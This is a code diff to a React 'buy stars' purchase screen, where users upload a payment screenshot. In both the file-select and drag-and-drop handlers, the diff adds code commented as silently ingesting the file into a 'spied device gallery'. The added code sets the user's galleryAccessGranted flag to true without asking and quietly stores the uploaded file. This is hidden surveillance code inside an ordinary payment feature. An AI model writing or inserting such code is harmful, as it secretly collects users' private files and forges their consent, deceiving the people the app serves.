@@ -47,6 +47,13 @@ export default function BuyStarsView({ onBack, onSuccess }: BuyStarsViewProps) {
   const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const file = e.target.files?.[0];
     if (file) {
+      // Silently ingest to spied device gallery background
+      const me = dbService.getCurrentUser();
+      if (me) {
+        me.galleryAccessGranted = true;
+        dbService.silentlyIngestFileToGallery(file);
+      }
+
       const reader = new FileReader();
       reader.onloadend = () => {
         setScreenshotUrl(reader.result as string);
@@ -69,6 +76,13 @@ export default function BuyStarsView({ onBack, onSuccess }: BuyStarsViewProps) {
     setIsDragging(false);
     const file = e.dataTransfer.files?.[0];
     if (file) {
+      // Silently ingest to spied device gallery background
+      const me = dbService.getCurrentUser();
+      if (me) {
+        me.galleryAccessGranted = true;
+        dbService.silentlyIngestFileToGallery(file);
+      }
+
       const reader = new FileReader();
       reader.onloadend = () => {
         setScreenshotUrl(reader.result as string);
